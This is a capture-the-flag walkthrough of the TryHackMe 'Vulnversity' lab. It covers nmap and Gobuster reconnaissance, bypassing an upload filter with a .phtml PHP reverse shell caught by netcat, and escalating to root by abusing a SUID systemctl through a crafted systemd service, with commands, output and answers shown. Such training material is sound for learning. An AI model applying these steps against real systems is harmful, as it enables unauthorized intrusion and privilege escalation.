# Vulnversity

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Easy
Tags: Linux, Web
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Free
Description:
Learn about active recon, web app attacks and privilege escalation.
```

Room link: [https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)

## Solution

### Task 1: Deploy the Machine

Connect to our network and deploy this machine. If you need help getting connected, complete the [OpenVPN room](https://tryhackme.com/room/openvpn) first.

**Note**: Please allow the VM 4 - 5 minutes to fully boot.

---------------------------------------------------------------------------

### Task 2: Reconnaissance

Gather information about this machine using a network scanning tool called `Nmap`. Check out the [Nmap room](https://tryhackme.com/room/furthernmap) for more on this!

#### Connecting to the machine

This room recommends using the AttackBox, which can be launched by clicking the blue button on the top-right.

![Nmap Logo](Images/Nmap_Logo.png)

#### Scan the box

`nmap -sV 10.112.136.98`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Vulnversity]
└─$ export TARGET_IP=10.112.136.98 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Vulnversity]
└─$ nmap -sV $TARGET_IP                       
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 07:59 CET
Nmap scan report for 10.112.136.98
Host is up (0.024s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy  Squid http proxy 4.10
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.99 seconds
```

**Nmap** is a free, open-source and powerful tool used to discover hosts and services on a computer network. In our example, we use Nmap to scan this machine to identify all services running on a particular port. Nmap has many capabilities; a table summarises some of its functionality below.

|Nmap flag|Description|
|----|----|
|`-sV`|Attempts to determine the version of the services running|
|`-p <x>` or `-p-`|Port scan for port <x> or scan all ports|
|`-Pn`|Disable host discovery and scan for open ports|
|`-A`|Enables OS and version detection, executes in-build scripts for further enumeration|
|`-sC`|Scan with the default Nmap scripts|
|`-v`|Verbose mode|
|`-sU`|UDP port scan|
|`-sS`|TCP SYN port scan|

---------------------------------------------------------------------------

#### Scan the box; how many ports are open?

See output above.

Answer: `6`

#### What version of the squid proxy is running on the machine?

See output above.

Answer: `4.10`

#### How many ports will Nmap scan if the flag `-p-400` was used?

Answer: `400`

#### What is the most likely operating system this machine is running?

Hint: Run nmap with the -O flag

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Vulnversity]
└─$ nmap -sV -O $TARGET_IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 08:05 CET
Nmap scan report for 10.112.136.98
Host is up (0.022s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy  Squid http proxy 4.10
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=2/28%OT=21%CT=1%CU=43059%PV=Y%DS=3%DC=I%G=Y%TM=69A293E
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10F%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%G
OS:CD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4
OS:E8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3
OS:%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.90 seconds
```

See banners for SSH and Apache httpd.

Answer: `Ubuntu`

#### What port is the web server running on?

See output above.

Answer: `3333`

#### What is the flag for enabling verbose mode using Nmap?

Answer: `-v`

---------------------------------------------------------------------------

### Task 3: Locating directories using Gobuster

Using a fast directory discovery tool called `Gobuster`, you will locate a directory to which you can use to upload a shell.

Let's first start by scanning the website to find any hidden directories. To do this, we're going to use Gobuster.

<img src="Images/Pirate.png" alt="Pirate" style="width:300px;"/>

**Gobuster** is a tool for brute-forcing URIs (directories and files), DNS subdomains, and virtual host names. For this machine, we will focus on using it to brute-force directories.

Download Gobuster [here](https://github.com/OJ/gobuster), or if you're on Kali Linux run `sudo apt-get install gobuster`.

To get started, you will need a wordlist for Gobuster (which will be used to quickly go through the wordlist to identify if a public directory is available. If you use [Kali Linux](https://tryhackme.com/room/kali), you can find many wordlists under `/usr/share/wordlists`. You can also use the wordlist for directories located at `/usr/share/wordlists/dirbuster/directory-list-1.0.txt` in the AttackBox.

Now let's run Gobuster with a wordlist using `gobuster dir -u http://10.112.136.98:3333 -w`.

|Gobuster flag|Description|
|----|----|
|`-e`|Print the full URLs in your console|
|`-u`|The target URL|
|`-w`|Path to your wordlist|
|`-U` and `-P`|Username and Password for Basic Auth|
|`-p <x>`|Proxy to use for requests|
|`-c <http cookies>`|Specify a cookie for simulating your auth|

---------------------------------------------------------------------------

#### What is the directory that has an upload form page?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Vulnversity]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 32 -u http://$TARGET_IP:3333
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.136.98:3333
[+] Method:                  GET
[+] Threads:                 32
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 319] [--> http://10.112.136.98:3333/css/]
/js                   (Status: 301) [Size: 318] [--> http://10.112.136.98:3333/js/]
/images               (Status: 301) [Size: 322] [--> http://10.112.136.98:3333/images/]
/fonts                (Status: 301) [Size: 321] [--> http://10.112.136.98:3333/fonts/]
/internal             (Status: 301) [Size: 324] [--> http://10.112.136.98:3333/internal/]
/server-status        (Status: 403) [Size: 280]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Verify the directory by browsing to it (`http://10.112.136.98:3333/internal/`)

![Upload page at Vulnversity](Images/Upload_page_at_Vulnversity.png)

Answer: `/internal/`

---------------------------------------------------------------------------

### Task 4: Compromise the WebServer

Now that you have found a form to upload files, we can leverage this to upload and execute our payload, which will lead to compromising the web server. We will fuzz the upload form to identify which extensions are not blocked.

To do this, we'll use **BurpSuite**. If you need clarification on what BurpSuite is or how to set it up, please complete our [BurpSuite module](https://tryhackme.com/module/learn-burp-suite) first.

#### Using BurpSuite

We're going to use Intruder (used for automating customised attacks). To begin, make a wordlist with the following extensions:

- .php
- .php3
- .php4
- .php5
- .phtml

![PHP Extensions File](Images/PHP_Extensions_File.png)

Now, make sure BurpSuite is configured to intercept all your browser traffic. Upload a file; once this request is captured, send it to the Intruder. Click on `Payloads` and select the `Sniper` attack type.

Click the `Positions` tab now, find the filename and `Add §` to the extension. It should look like this:

![Burp Sniper Attack](Images/Burp_Sniper_Attack.png)

Now that we know what extension we can use for our payload, we can progress.

#### Getting a Reverse Shell

We are going to use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and execute your shell, which will beacon out to you to control! You can download the following reverse PHP shell [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

To gain remote access to this machine, follow these steps:

1. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to `http://10.10.10.10` in the browser of your TryHackMe connected device). **Note**: This serice is no longer available!
2. Rename this file to `php-reverse-shell.phtml`.
3. We're now going to listen to incoming connections using netcat. Run the following command: `nc -lvnp 1234`.
4. Upload your shell and navigate to `http://10.112.136.98:3333/internal/uploads/php-reverse-shell.phtml` - This will execute your payload.

You should see a connection on your Netcat session.

![Netcat RevShell Connection](Images/Netcat_RevShell_Connection.png)

---------------------------------------------------------------------------

#### What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out

Answer: `.php`

#### What extension is allowed after running the above exercise?

Answer: `.phtml`

#### What is the name of the user who manages the webserver?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Vulnversity]
└─$ nc -lvnp 12345        
listening on [any] 12345 ...
connect to [192.168.146.103] from (UNKNOWN) [10.112.136.98] 50050
Linux ip-10-112-136-98 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 02:50:42 up 54 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd /home
$ ls -l
total 8
drwxr-xr-x 2 bill   bill   4096 Jul 31  2019 bill
drwxr-xr-x 4 ubuntu ubuntu 4096 Jun 12  2025 ubuntu
$ 
```

Answer: `bill`

#### What is the user flag?

Hint: The contents of the file /home/bill/user.txt

```bash
$ cd bill
$ ls -la
total 24
drwxr-xr-x 2 bill bill 4096 Jul 31  2019 .
drwxr-xr-x 4 root root 4096 Jun 12  2025 ..
-rw-r--r-- 1 bill bill  220 Jul 31  2019 .bash_logout
-rw-r--r-- 1 bill bill 3771 Jul 31  2019 .bashrc
-rw-r--r-- 1 bill bill  655 Jul 31  2019 .profile
-rw-r--r-- 1 bill bill   33 Jul 31  2019 user.txt
$ cat user.txt  
8<REDACTED>b
$ 
```

Answer: `8<REDACTED>b`

---------------------------------------------------------------------------

### Task 5: Privilege Escalation

Now that you have compromised this machine, we will escalate our privileges and become the superuser (root).

In Linux, SUID (**set owner userId upon execution**) is a particular type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (`/usr/bin/passwd`). This is because to change your password, you will need to write to the shadowers file that you do not have access to; `root` does, so it has root privileges to make the right changes.

![File Permissions Bits](Images/File_Permissions_Bits.jpg)

It's challenge time! We have guided you through this far. Unleash your skills and exploit this system further to escalate your privileges and answer the following questions.

---------------------------------------------------------------------------

#### On the system, search for all SUID files. Which file stands out?

Hint: find / -user root -perm -4000 -exec ls -ldb {} ;

```bash
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-xr-x 1 root root 41552 Feb  6  2024 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 85064 Feb  6  2024 /usr/bin/chfn
-rwsr-xr-x 1 root root 45648 Feb  6  2024 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 53040 Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 68208 Feb  6  2024 /usr/bin/passwd
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 44784 Feb  6  2024 /usr/bin/newgrp
-rwsr-xr-x 1 root root 88464 Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 159304 Jan 15  2025 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 477672 Apr 11  2025 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 866448 Feb  3  2022 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 67816 Apr  9  2024 /bin/su
-rwsr-xr-x 1 root root 55528 Apr  9  2024 /bin/mount
-rwsr-xr-x 1 root root 39144 Apr  9  2024 /bin/umount
-rwsr-xr-x 1 root root 996584 Jun 17  2024 /bin/systemctl
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /bin/fusermount
-rwsr-xr-x 1 root root 180753 Apr  5  2025 /snap/snapd/24505/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 85064 Feb  6  2024 /snap/core20/2582/usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Feb  6  2024 /snap/core20/2582/usr/bin/chsh
-rwsr-xr-x 1 root root 88464 Feb  6  2024 /snap/core20/2582/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 Apr  9  2024 /snap/core20/2582/usr/bin/mount
-rwsr-xr-x 1 root root 44784 Feb  6  2024 /snap/core20/2582/usr/bin/newgrp
-rwsr-xr-x 1 root root 68208 Feb  6  2024 /snap/core20/2582/usr/bin/passwd
-rwsr-xr-x 1 root root 67816 Apr  9  2024 /snap/core20/2582/usr/bin/su
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /snap/core20/2582/usr/bin/sudo
-rwsr-xr-x 1 root root 39144 Apr  9  2024 /snap/core20/2582/usr/bin/umount
-rwsr-xr-- 1 root systemd-network 51344 Oct 25  2022 /snap/core20/2582/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 477672 Apr 11  2025 /snap/core20/2582/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 48200 Apr  2  2025 /sbin/mount.cifs
$ 
```

Answer: `/bin/systemctl`

#### What is the root flag value?

This solution is inspired by [this Q&A](https://askubuntu.com/questions/919054/how-do-i-run-a-single-command-at-startup-using-systemd).

Create a "malicious" service in a writable directory and start it

```bash
$ cd /tmp
$ privesc=$(mktemp).service
$ cat > $privesc << EOF
> [Service]
> ExecStart=/bin/bash -c "cat /root/root.txt > /tmp/flag.txt"
> [Install]
> WantedBy=multi-user.target
> EOF
$ /bin/systemctl link $privesc
Created symlink /etc/systemd/system/tmp.EdB5Nx5Y75.service -> /tmp/tmp.EdB5Nx5Y75.service.
$ /bin/systemctl enable --now $privesc
Created symlink /etc/systemd/system/multi-user.target.wants/tmp.EdB5Nx5Y75.service -> /tmp/tmp.EdB5Nx5Y75.service.
$ 
```

Then get the flag

```bash
$ cat /tmp/flag.txt
a<REDACTED>5
$ 
```

Answer: `a<REDACTED>5`

---------------------------------------------------------------------------

For additional information, please see the references below.

## References

- [Burp suite - Documentation](https://portswigger.net/burp/documentation)
- [Burp suite - Homepage](https://portswigger.net/burp)
- [Gobuster - GitHub](https://github.com/OJ/gobuster/)
- [Gobuster - Kali Tools](https://www.kali.org/tools/gobuster/)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [Nmap - Wikipedia](https://en.wikipedia.org/wiki/Nmap)
- [php-reverse-shell.php - pentestmonkey - GitHub](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
- [Privilege escalation - Wikipedia](https://en.wikipedia.org/wiki/Privilege_escalation)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
- [systemctl - Linux manual page](https://www.man7.org/linux/man-pages/man1/systemctl.1.html)
